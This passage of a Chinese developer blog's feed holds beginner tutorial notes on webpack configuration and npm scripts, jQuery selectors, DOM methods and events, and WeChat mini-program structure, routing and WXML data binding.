<p>webpack实际上对ES2015语法进行了转码，通过查看node_modules目录可以看到webpack通过引入babel-preset-es2015来进行ES2015语法的转码。除了<code>import</code>和<code>export</code>，的webpackk支持各种其他模块语法。</p>
<p><strong>注意：</strong>  除了<code>import</code>和<code>export</code>声明，webpack不会改变其他代码，如果要使用ES2015的其他特性，请确保通过webpack loader系统使用了像babel这样的转码器。</p>
<h2 id="使用一个配置文件-Using-a-Configuration"><a href="#使用一个配置文件-Using-a-Configuration" class="headerlink" title="使用一个配置文件(Using a Configuration)"></a>使用一个配置文件(Using a Configuration)</h2><p>在 webpack 4 中，可以无须任何配置使用，然而大多数项目会需要很复杂的设置，这就是为什么 webpack 仍然要支持 配置文件。这比在终端(terminal)中手动输入大量命令要高效的多，创建一个取代以上使用 CLI 选项方式的配置文件。</p>
<p>在项目根目录下创建webpack.config.js，用来配置webpack,内容如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./src/index.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'main.js'</span>,</div><div class="line">    path: path.resolve(__dirname, <span class="string">'dist'</span>)</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>通过新配置文件再次执行构建:<code>npx webpack --config webpack.config.js</code>。</p>
<p><strong>注意：</strong> 如果 webpack.config.js 存在，则 webpack 命令将默认选择使用它。在这里使用 <code>--config</code> 选项只是表明，可以传递任何名称的配置文件，这对于需要拆分成多个文件的复杂配置是非常有用。</p>
<p>比起 CLI 这种简单直接的使用方式，配置文件具有更多的灵活性。可以通过配置方式指定 loader 规则、插件、解析选项，以及许多其他增强功能。</p>
<h2 id="NPM-脚本-NPM-Scripts"><a href="#NPM-脚本-NPM-Scripts" class="headerlink" title="NPM 脚本(NPM Scripts)"></a>NPM 脚本(NPM Scripts)</h2><p>考虑到用 CLI 这种方式来运行本地的 webpack 不是特别方便，可以设置一个快捷方式，在 package.json 添加一个 npm 脚本(npm script)：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="attr">"name"</span>: <span class="string">"webpack-demo"</span>,</div><div class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</div><div class="line">  <span class="attr">"description"</span>: <span class="string">""</span>,</div><div class="line">  <span class="attr">"private"</span>: <span class="literal">true</span>,</div><div class="line">  <span class="attr">"scripts"</span>: &#123;</div><div class="line">    <span class="attr">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</div><div class="line">    <span class="attr">"build"</span>: <span class="string">"webpack"</span>  //此处为添加的npm脚本</div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"keywords"</span>: [],</div><div class="line">  <span class="attr">"author"</span>: <span class="string">""</span>,</div><div class="line">  <span class="attr">"license"</span>: <span class="string">"ISC"</span>,</div><div class="line">  <span class="attr">"devDependencies"</span>: &#123;</div><div class="line">    <span class="attr">"webpack"</span>: <span class="string">"4.8.3"</span>,</div><div class="line">    <span class="attr">"webpack-cli"</span>: <span class="string">"2.1.3"</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">"dependencies"</span>: &#123;</div><div class="line">    <span class="attr">"lodash"</span>: <span class="string">"4.17.10"</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>现在，可以使用 <code>npm run build</code> 命令，来替代之前使用的 <code>npx webpack</code> 命令生成打包脚本。</p>
<p><strong>注意：</strong> 使用 npm 的 <code>scripts</code>，可以像使用 <code>npx</code> 那样通过模块名引用本地安装的 npm 包。这是大多数基于 npm 的项目遵循的标准，因为它允许所有贡献者使用同一组通用脚本（如果必要，每个 flag 都带有 <code>--config</code> 标志）。</p>
<p><strong>注意：</strong> 通过向 <code>npm run build</code> 命令和你的参数之间添加两个中横线，可以将自定义参数传递给 webpack，例如：<code>npm run build -- --colors</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于webpck基本使用的入门总结。&lt;br&gt;
    
    </summary>
    
      <category term="Webpack" scheme="http://yoursite.com/categories/Webpack/"/>
    
    
      <category term="Webpack" scheme="http://yoursite.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>jQuery学习</title>
    <link href="http://yoursite.com/2018/03/28/jQuery%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/03/28/jQuery学习/</id>
    <published>2018-03-28T01:02:51.000Z</published>
    <updated>2018-03-28T02:38:24.566Z</updated>
    
    <content type="html"><![CDATA[<p>JQuery是一个轻量级的JavaScript库。核心是JavaScript，不仅兼容CSS3，还兼容各种浏览器。<br><a id="more"></a></p>
<h1 id="jQuery对象与DOM对象"><a href="#jQuery对象与DOM对象" class="headerlink" title="jQuery对象与DOM对象"></a>jQuery对象与DOM对象</h1><p>jQuery对象与DOM对象是不一样的。jQuery对象是一个类数组对象，而DOM对象就是一个单独的DOM元素。</p>
<p><strong>如何把jQuery对象转成DOM对象？</strong> (1)利用数组下标的方式读取到jQuery中的DOM对象 (2)通过jQuery自带的get()方法，例如`$div.get(0)。</p>
<p><strong>DOM对象转化成jQuery对象</strong> 传递给$(DOM)函数的参数是一个DOM对象，jQuery方法会把这个DOM对象给包装成一个新的jQuery对象，就可以调用jQuery的方法了。</p>
<h1 id="jQuery各种选择器"><a href="#jQuery各种选择器" class="headerlink" title="jQuery各种选择器"></a>jQuery各种选择器</h1><p><strong>id选择器：</strong> <code>$(&quot;#id&quot;)</code></p>
<p><strong>类选择器：</strong> <code>$(&quot;.class&quot;)</code></p>
<p><strong>元素选择器：</strong> <code>$(&quot;element&quot;)</code></p>
<p><strong>全选择器：</strong> <code>$(&quot;*&quot;)</code></p>
<p><strong>层级选择器：</strong> 子选择器<code>$(&quot;parent &gt; child&quot;)</code>、 后代选择器<code>$(&quot;ancestor descendant&quot;)</code>、 相邻兄弟选择器<code>$(&quot;pre + next&quot;)</code>、 一般兄弟选择器<code>$(&quot;pre ~ siblings&quot;)</code></p>
<p><strong>基本筛选选择器：</strong></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/jq%E5%9F%BA%E6%9C%AC%E7%AD%9B%E9%80%89%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="基本筛选选择器"></p>
<p><strong>内容筛选选择器：</strong> </p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/%E5%86%85%E5%AE%B9%E7%AD%9B%E9%80%89%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="内容筛选选择器"></p>
<p><strong>可见性筛选选择器：</strong> <code>$(&quot;:visible&quot;)</code>与<code>$(&quot;:hidden&quot;)</code>。:hidden选择器，不只包括display:none的元素，还包括隐藏表单、visibility等。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/%E9%9A%90%E8%97%8F%E5%85%83%E7%B4%A0.png" alt="隐藏元素"></p>
<p><strong>属性选择器：</strong> </p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/%E5%B1%9E%E6%80%A7%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="属性选择器"></p>
<p><strong>子元素筛选选择器：</strong> </p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/%E5%AD%90%E5%85%83%E7%B4%A0%E7%AD%9B%E9%80%89%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="子元素筛选选择器"></p>
<p><strong>表单元素选择器:</strong> </p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/jQuery%E5%AD%A6%E4%B9%A0/images/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="表单元素选择器"></p>
<p><strong>表单对象属性筛选选择器:</strong></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/%E8%A1%A8%E5%8D%95%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E7%AD%9B%E9%80%89%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="表单对象属性筛选选择器"></p>
<p><strong>this选择器:</strong></p>
<pre><code>$(&apos;p&apos;).click(function() {
    //将p元素转化为jQuery对象
    var $this = $(this);
    $this.css(&apos;color&apos;, &apos;red&apos;);
});
</code></pre><h1 id="操作jQuery-DOM的方法"><a href="#操作jQuery-DOM的方法" class="headerlink" title="操作jQuery DOM的方法"></a>操作jQuery DOM的方法</h1><p>1、 .attr()与.removeAttr()</p>
<p>2、 .html()及.text()</p>
<p>3、 .val()处理表单元素的值</p>
<p>4、 .addClass() .removeClass() 增加增加/删除类名改变样式</p>
<p>5、 .toggleClass() 切换样式</p>
<p>6、  .css() 样式操作</p>
<p>7、  .data() 数据存储，类似于原生DOM通过自定义属性data-来传递数据</p>
<p>8、 通过 <code>$(&quot;html结构&quot;)</code>创建节点</p>
<p>9、 .append()与 .appendTo()、 .prepend()与 .prependTo() DOM内部插入</p>
<p>10、 .after()与 .before()、 .insertAfter()与.insertBefore() DOM外部插入</p>
<p>11、 .empty()只清空指定元素所有子节点</p>
<p>12、 .remove() 会将自身也移除，可传递一个筛选表达式</p>
<p>13、 .detach() 临时删除页面上的节点，但是又不希望节点上的数据与事件丢失，事件及数据不删除，仅显示效果不在，在内存中还存在</p>
<p>14、 .clone() 克隆节点，深复制</p>
<p>15、 .replaceWith()和.replaceAll() DOM替换</p>
<p>16、 .wrap() /.wrapAll() 将元素用其他元素包裹起来，也就是给它增加一个父元素</p>
<p>17、 .unwrap() 将匹配元素集合的父级元素删除，保留自身（和兄弟元素，如果存在）在原来的位置</p>
<p>18、 .wrapInner()  将合集中的元素内部所有的子元素用其他元素包裹起来，并当作指定元素的子元素</p>
<p>19、 .children() 查找合集里面的第一级子元素</p>
<p>20、 .find() 查找后代元素</p>
<p>21、 .parent()  查找合集里面的每一个元素的父元素</p>
<p>22、 .parents() 查找合集里面的每一个元素的所有祖辈元素</p>
<p>23、 .closest() 查找当前元素的最近的父辈祖辈元素</p>
<p>24、 .next() 查找指定元素集合中每一个元素紧邻的后面同辈元素的元素集合</p>
<p>25、 .prev() 查找指定元素集合中每一个元素紧邻的前面同辈元素的元素集合</p>
<p>26、 .siblings() 查找指定元素集合中每一个元素的同辈元素</p>
<p>27、 .add() 用来创建一个新的jQuery对象 ，将元素添加到匹配的元素集合中</p>
<p>28、 .each() </p>
<h1 id="jQuery事件"><a href="#jQuery事件" class="headerlink" title="jQuery事件"></a>jQuery事件</h1><p>1、 click与dbclick 鼠标点击</p>
<pre><code>$(&quot;#ele&quot;).click(function() {

});
//传递数据进去
$(&quot;#ele&quot;).click([eventData,] function() {

});
</code></pre><p>2、 mousedown与mouseup、 mousemove、 mouseover与mouseout、 mouseenter与mouseleave</p>
<p>3、 hover</p>
<p>4、 focusin与focusout(支持冒泡)、 blur与focus(不支持冒泡)</p>
<p>5、 change 用于监听<code>&lt;input&gt;</code>元素，<code>&lt;textarea&gt;</code>和<code>&lt;select&gt;</code>元素的值</p>
<p>6、 select 当 textarea 或文本类型的 input 元素中的文本被选择时触发</p>
<p>7、 submit</p>
<p>8、 keydown()与keyup()、 keypress()</p>
<p>9、 on() 多事件绑定，所有的快捷事件在底层的处理都是通过一个”on”方法来实现。支持事件委托。</p>
<pre><code>$(&quot;#ele&quot;).click(function() { //快捷方式

});
$(&quot;#ele&quot;).on(&apos;click&apos;, function() { //on方式

});
</code></pre><p>10、 off() 卸载事件</p>
<p><strong>11、 jQuery事件对象的属性和方法</strong></p>
<pre><code>event.type //获取事件类型
event.pageX 和event.pageY //获取鼠标当前相对于页面的坐标
event.preventDefault() //阻止默认行为
event.stopPropagation() //阻止事件冒泡
event.which  //单击的鼠标的哪个键
event.currentTarget //在冒泡过程中的当前DOM元素
event.target //事件的目标DOM元素
</code></pre><p>12、 自定义事件 trigger(会冒泡)。 trigger除了能够触发浏览器事件，同时还支持自定义事件，并且自定义事件还支持传递参数。</p>
<p>13、 自定义事件 triggerHandler(不冒泡)</p>
<h1 id="动画方法"><a href="#动画方法" class="headerlink" title="动画方法"></a>动画方法</h1><p>1、 .hide(“fast/slow”)</p>
<p>2、 .show()</p>
<p>3、 .toggle()</p>
<p>4、 .slideDown() 下拉动画</p>
<p>5、 .slideUp() 上卷动画</p>
<p>6、 .slideToggle() 上卷下拉切换</p>
<p>7、 .fadeIn()、 .fadeOut() 淡入淡出动画, opacity为0-1</p>
<p>8、 .fadeTo()可以到自定义的opacity</p>
<p>9、 .fadeToggle() 切换淡入淡出</p>
<p>10、 .animate() 动画</p>
<p>11、 .stop() 停止动画</p>
<h1 id="其他常用方法"><a href="#其他常用方法" class="headerlink" title="其他常用方法"></a>其他常用方法</h1><p>1、 .inArray() 查找数组中的索引 <code>$.inArray(value, array [, fromIndex])</code></p>
<p>2、 .trim() 去空格</p>
<p>3、 .get()  单独操作合集中的的某一个元素，可以通过.get([index])方法获取到。</p>
<p>4、 .index() 从匹配的元素中搜索给定元素的索引值</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JQuery是一个轻量级的JavaScript库。核心是JavaScript，不仅兼容CSS3，还兼容各种浏览器。&lt;br&gt;
    
    </summary>
    
      <category term="jQuery" scheme="http://yoursite.com/categories/jQuery/"/>
    
    
      <category term="jQuery" scheme="http://yoursite.com/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>微信小程序开发文档总结</title>
    <link href="http://yoursite.com/2018/03/26/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/03/26/微信小程序开发文档总结/</id>
    <published>2018-03-26T14:15:57.000Z</published>
    <updated>2018-05-29T02:36:14.215Z</updated>
    
    <content type="html"><![CDATA[<p>小程序开发文档的简要概括。<br><a id="more"></a></p>
<h1 id="基本的文件结构"><a href="#基本的文件结构" class="headerlink" title="基本的文件结构"></a>基本的文件结构</h1><p>最关键也是必不可少的，是 app.js、app.json、app.wxss 这三个，<code>.js</code>后缀的是脚本文件，<code>.json</code>后缀的文件是配置文件，<code>.wxss</code>后缀的是样式表文件。</p>
<p><code>app.js</code>： 是小程序的脚本代码。我们可以在这个文件中监听并处理小程序的生命周期函数、声明全局变量，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。 调用框架提供的丰富的 API，如本例的同步存储及同步读取本地数据。</p>
<p><code>app.json</code>： 对整个小程序的全局配置。可以在这个文件中配置小程序是由哪些页面(<code>&quot;pages&quot;</code>)组成，配置小程序的窗口(<code>&quot;window&quot;</code>)背景色，配置导航条样式，配置默认标题。注意该文件不可添加任何注释。</p>
<p><code>app.wxss</code>： 整个小程序的公共样式表。我们可以在页面组件的 class 属性上直接使用 app.wxss 中声明的样式规则。</p>
<h1 id="创建页面"><a href="#创建页面" class="headerlink" title="创建页面"></a>创建页面</h1><p>小程序的页面都在根目录下的pages文件目录，例如一开始的示例程序中（有展示用户头像的欢迎页和小程序启动日志展示页），这两个页面都在pages目录下，即<code>pages/index/</code>和<code>pages/logs/</code>。</p>
<p>微信小程序中的每一个页面的【路径+页面名】都需要写在 app.json 的 <code>&quot;pages&quot;</code> 中，且 <code>&quot;pages&quot;</code> 中的第一个页面是小程序的首页。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">"pages"</span>:[</div><div class="line">  <span class="string">"pages/index/index"</span>,</div><div class="line">  <span class="string">"pages/logs/logs"</span></div><div class="line">],</div></pre></td></tr></table></figure>
<p>每一个小程序页面是由同路径下同名的四个不同后缀文件的组成，如：index.js(脚本)、 index.wxml(页面结构)、 index.wxss(样式表)、 index.json(配置)。</p>
<ul>
<li><p>index.wxml 是页面的结构文件。</p>
</li>
<li><p>index.js 是页面的脚本文件，在这个文件中我们可以监听并处理页面的生命周期函数、获取小程序实例，声明并处理数据，响应页面交互事件等。</p>
</li>
<li><p>index.wxss 是页面的样式表。 页面的样式表是非必要的。当有页面样式表时，页面的样式表中的样式规则会层叠覆盖 app.wxss 中的样式规则。如果不指定页面的样式表，也可以在页面的结构文件中直接使用 app.wxss 中指定的样式规则。</p>
</li>
</ul>
<p>注意微信小程序开发中使用了新的尺寸单位，<code>rpx</code>(responsive pixel)，可以根据屏幕宽度自适应，规定屏幕宽度为750rpx。</p>
<p>如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。微信官方建议视觉稿以iPhone 6为标准。(补充rem: 规定屏幕宽度为20rem，所以1rem=750/20 rpx)</p>
<ul>
<li>index.json 是页面的配置文件。 页面的配置文件是非必要的。当有页面的配置文件时，配置项在该页面会覆盖 app.json 的 window 中相同的配置项。如果没有指定的页面配置文件，则在该页面直接使用 app.json 中的默认配置。</li>
</ul>
<p>文件目录安排如下所示如下图所示。<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="小程序基本的目录结构"></p>
<h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><p>框架提供了自己的视图层描述语言WXML和WXSS，以及基于JavaScript的逻辑层框架，并在视图层与逻辑层间提供了数据传输和事件系统，可以让开发者可以方便的聚焦于数据与逻辑上。</p>
<ul>
<li>响应的数据绑定</li>
</ul>
<p>框架的核心是一个响应的数据绑定系统。整个系统分为两块视图层(View)和逻辑层(App Service)。框架可以让数据与视图非常简单地保持同步。当做数据修改的时候，只需要在逻辑层修改数据，视图层就会做相应的更新。</p>
<ul>
<li>页面管理</li>
</ul>
<p>框架管理了整个小程序的页面路由，可以做到页面间的无缝切换，并给以页面完整的生命周期。开发者需要做的只是将页面的数据，方法，生命周期函数注册进框架中，其他的一切复杂的操作都交由框架处理。</p>
<ul>
<li>基础组件</li>
</ul>
<p>框架提供了一套基础的组件，这些组件自带微信风格的样式以及特殊的逻辑，开发者可以通过组合基础组件，创建出强大的微信小程序 。</p>
<ul>
<li>丰富的API</li>
</ul>
<p>框架提供丰富的微信原生API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>使用app.json文件来对微信小程序进行全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。<a href="https://www.w3cschool.cn/weixinapp/hw9k1q8m.html" target="_blank" rel="noopener">app.json的配置项</a>列表包括： <code>pages</code> <code>window</code> <code>tabBar</code> <code>networkTimeout</code> <code>debug</code>。</p>
<p><code>pages</code> ：接受一个数组，每一项都是字符串，来指定小程序由哪些页面组成。每一项代表对应页面的【路径+文件名】信息，数组的第一项代表小程序的初始页面。小程序中新增/减少页面，都需要对 pages 数组进行修改。 文件名不需要写文件后缀，因为框架会自动去寻找路径.json,.js,.wxml,.wxss的四个文件进行整合。</p>
<p><code>window</code>： 用于设置小程序的状态栏、导航条、标题、窗口背景色。具体参数如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E9%85%8D%E7%BD%AE%E9%A1%B9window%E5%8F%82%E6%95%B0.png" alt="window配置项参数"></p>
<p><code>tabBar</code>： 如果我们的小程序是一个多 tab 应用（客户端窗口的底部有tab栏可以切换页面），那么我们可以通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p>
<p>page.json： 每一个小程序页面也可以使用.json文件来对本页面的窗口表现进行配置。页面的配置比app.json全局配置简单得多，只是设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。页面的.json只能设置window相关的配置项，以决定本页面的窗口表现，所以无需写window这个键。</p>
<h1 id="逻辑层-APP-Service"><a href="#逻辑层-APP-Service" class="headerlink" title="逻辑层(APP Service)"></a>逻辑层(APP Service)</h1><p>小程序开发框架的逻辑层是由JavaScript编写。 逻辑层将数据进行处理后发送给视图层，同时接受视图层的事件反馈。 在javascript基础上，增加 App 和 Page 方法，进行程序和页面的注册； 提供丰富的 API，如扫一扫，支付等微信特有能力； 每个页面有独立的作用域，并提供模块化能力； 由于框架并非运行在浏览器中，所以 JavaScript 在 web 中一些能力都无法使用，如 document，window 等； 开发者写的所有代码最终将会打包成一份 JavaScript，并在小程序启动的时候运行，直到小程序销毁。类似 ServiceWorker，所以逻辑层也称之为 App Service。</p>
<h2 id="注册程序"><a href="#注册程序" class="headerlink" title="注册程序"></a>注册程序</h2><p><strong>APP()</strong></p>
<p>App()函数用来注册一个小程序。接受一个object参数，其指定小程序的生命周期函数等。<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/APP%E6%B3%A8%E5%86%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.png" alt="APP注册参数说明"></p>
<p>前台、后台定义：当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台。需要注意的是：只有当小程序进入后台一定时间，或者系统资源占用过高，才会被真正的销毁。</p>
<p>关闭小程序(基础库版本1.1.0开始支持)：当用户从扫一扫、转发等入口(场景值为1007, 1008, 1011, 1025)进入小程序，且没有置顶小程序的情况下退出，小程序会被销毁。小程序运行机制在基础库版本 1.4.0 有所改变：上一条关闭逻辑在新版本已不适用，。</p>
<p><strong>getAPP()</strong></p>
<p>提供了全局的getApp()函数，可以获取到小程序实例。</p>
<p><strong>注意：</strong>App()必须在app.js中注册，且不能注册多个。</p>
<p>不要在定义于App()内的函数中调用getApp()，使用this就可以拿到app实例。</p>
<p>不要在onLaunch的时候调用getCurrentPage()，此时page还没有生成。</p>
<p>通过getApp()获取实例之后，不要私自调用生命周期函数。</p>
<h2 id="场景值"><a href="#场景值" class="headerlink" title="场景值"></a>场景值</h2><p><a href="https://www.w3cschool.cn/weixinapp/weixinapp-scene.html" target="_blank" rel="noopener">场景值</a>描述了开启小程序的来源，例如如果从发现栏小程序主入口开启，场景值为1001。可以在 App 的 onLaunch 和 onShow 中获取。</p>
<h2 id="注册页面"><a href="#注册页面" class="headerlink" title="注册页面"></a>注册页面</h2><p><strong>Page()</strong></p>
<p>Page() 函数用来注册一个页面。接受一个 object 参数，其指定页面的初始数据、生命周期函数、事件处理函数等。</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%86%8C%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E.png" alt="页面注册参数说明"></p>
<p><strong>初始化数据</strong> 将作为页面的第一次渲染。data 将会以 JSON 的形式由逻辑层传至渲染层，所以其数据必须是可以转成 JSON 的格式：字符串，数字，布尔值，对象，数组。渲染层可以通过 WXML 对数据进行绑定。</p>
<pre><code>Page.prototype.route  route字段可以获取到当前页面的路径。
Page.prototype.setData()  setData 函数用于将数据从逻辑层发送到视图层，同时改变对应的 this.data 的值。
</code></pre><p>setData() 参数格式： 接受一个对象，以 key，value 的形式表示将 this.data 中的 key 对应的值改变成 value。ey 可以非常灵活，以数据路径的形式给出，如 array[2].message，a.b.c.d，并且不需要在 this.data 中预先定义。</p>
<p>注意：</p>
<pre><code>直接修改 this.data 而不调用 this.setData 是无法改变页面的状态的，还会造成数据不一致
单次设置的数据不能超过1024kB，请尽量避免一次设置过多的数据。
</code></pre><p><strong>Page实例的生命周期</strong></p>
<p><img src="https://mp.weixin.qq.com/debug/wxadoc/dev/image/mina-lifecycle.png" alt="Page实例的生命周期"></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><strong>页面路由：</strong>所有页面的路由全部由框架进行管理。</p>
<p><strong>页面栈：</strong> 框架以栈的形式维护了当前的所有页面。当发生路由切换的时候，页面栈的表现如下：<br><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E8%B7%AF%E7%94%B1%E4%B8%8E%E9%A1%B5%E9%9D%A2%E6%A0%88.png" alt="路由与页面栈"></p>
<p><strong>getCurrentPages()</strong> 用于获取当前页面栈的实例，以数组形式按栈的顺序给出，第一个元素为首页，最后一个元素为当前页面。(注意;不要尝试修改页面栈，会导致路由以及页面状态错误。)</p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/%E8%B7%AF%E7%94%B1%E7%9A%84%E8%A7%A6%E5%8F%91%E6%96%B9%E5%BC%8F.png" alt="路由的触发方式"></p>
<p><img src="http://ou3oh86t1.bkt.clouddn.com/smallProgram/images/Tab%E5%88%87%E6%8D%A2%E5%AF%B9%E5%BA%94%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="Tab切换对应的生命周期"></p>
<pre><code>navigateTo,redirectTo只能打开非 tabBar 页面。
switchTab 只能打开 tabBar 页面。
reLaunch 可以打开任意页面。
页面底部的 tabBar 由页面决定，即只要是定义为 tabBar 的页面，底部都有 tabBar。
调用页面路由带的参数可以在目标页面的onLoad中获取。
</code></pre><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>文件作用域：在JavaScript文件中声明的变量和函数只在该文件中有效；不同的文件中可以声明相同名字的变量和函数，不会互相影响。</p>
<p>通过全局函数getApp()可以获取全局的应用实例，如果需要全局的数据可以在App()中设置全局数据。</p>
<p><strong>模块化：</strong> 将一些公共的代码抽离成为一个单独的js文件，作为一个模块。模块只有通过module.exports或者 exports才能对外暴露接口。​在需要使用这些模块的文件中，使用require(path)将公共代码引入(tips: require暂时不支持绝对路径)。</p>
<p>注意： exports是module.exports的一个引用，因此在模块里边随意更改exports的指向会造成未知的错误。所以我们更推荐开发者采用module.exports来暴露模块接口，除非你已经清晰知道这两者的关系。</p>
<h1 id="视图层-View"><a href="#视图层-View" class="headerlink" title="视图层(View)"></a>视图层(View)</h1><h2 id="WXML"><a href="#WXML" class="headerlink" title="WXML"></a>WXML</h2><p>WXML(WeiXin Markup Language)是框架设计的一套标签语言，结合基础组件、事件系统，可以构建出页面的结构。</p>
<p>WXML具有数据绑定、列表渲染、条件渲染、模板、事件、引用等功能。</p>
<h3 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h3><p>WXML中的动态数据均来自对应Page的 <code>data</code>对象中的数据。数据绑定使用 双大括号 将变量包起来。</p>
<p>（1）用于内容： <code>&lt;view&gt; {{ message }} &lt;/view&gt;</code></p>
<p>（2）组件属性(需要在双引号之内)： <code>&lt;view id=&quot;item-{{id}}&quot;&gt; &lt;/view&gt;</code></p>
<p>（3）控制属性(需要在双引号之间)： <code>&lt;view wx:if=&quot;{{condition}}&quot;&gt; &lt;/view&gt;</code></p>
<p>（4）关键字(需要在双引号之间)： <code>&lt;checkbox checked=&quot;{{false}}&quot;&gt; &lt;/checkbox&gt;</code> 其中 false：boolean 类型的 false，代表假值。<br>注意: 特别注意：不要直接写 <code>checked=&quot;false&quot;</code>，其计算结果是一个字符串，转成 boolean 类型后代表真值。</p>
<p>（5）计算： 可以在{{}}内进行简单的运算。支持以下几种方式，</p>
<p>三元运算： <code>&lt;view hidden="{{flag ? true : false}}&quot;&gt; Hidden &lt;/view&gt;</code></p>
<p>算数运算： <code>view&gt; {{a + b}} + {{c}} + d &lt;/view&gt;</code></p>
<p>逻辑判断： <code>&lt;view wx:if=&quot;{{length > 5}}&quot;&gt; &lt;/view&gt;</code></p>
<p>字符串运算： <code>&lt;view&gt;{{"hello" + name}}&lt;/view&gt;</code></p>
<p>数据路径运算： <code>&lt;view&gt;{{object.key}} {{array[0]}}&lt;/view&gt;</code></p>
<p>组合： 也可以在Mustache(双大括号)内直接进行组合，构成新的对象或者数组。</p>
<p>数组：<code>&lt;view wx:for-items=&quot;{{[zero, 1, 2, 3, 4]}}&quot;&gt; {{item}} &lt;/view&gt;</code></p>
<pre><code>Page({
  data: {
    zero: 0
  }
})
</code></pre><p>对象： <code>&lt;template is=&quot;objectCombine&quot; data=&quot;{{for: a, bar: b}}&quot;&gt;&lt;/template&gt;</code>， 最终组合成的对象是<code>{for: 1, bar: 2}</code></p>
<pre><code>Page({
  data: {
    a: 1,
    b: 2
  }
})
</code></pre><p>也可以用扩展运算符…来将一个对象展开，<code>&lt;template is=&quot;objectCombine&quot; data=&quot;{{...obj1, ...obj2, e: 5}}&quot;&gt;&lt;/template&gt;</code>,最终组合成的对象是<code>{a: 1, b: 2, c: 3, d: 4, e: 5}</code></p>
<pre><code>Page({
  data: {
    obj1: {
      a: 1,
      b: 2
    },
    obj2: {
      c: 3,
      d: 4
    }
  }
})
